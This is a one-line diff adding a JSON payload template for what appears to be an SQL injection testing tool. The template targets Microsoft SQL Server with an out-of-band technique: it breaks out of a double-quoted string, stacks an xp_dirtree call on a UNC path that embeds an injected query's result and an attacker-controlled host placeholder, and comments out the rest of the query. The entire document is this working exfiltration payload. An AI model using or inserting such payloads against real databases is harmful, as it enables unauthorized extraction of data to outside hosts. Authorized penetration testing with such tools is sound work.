@@ -1,0 +1,1 @@
+{"dbms": "mssql", "technique": "oob", "boundary": {"prefix": "\"", "suffix": "-- -", "type": "double"}, "vector": "{B} ; EXEC('master..xp_dirtree \"\\\\'+({Q})+'.{OOB}\"')", "comment": "mssql oob: double, inline comment"}
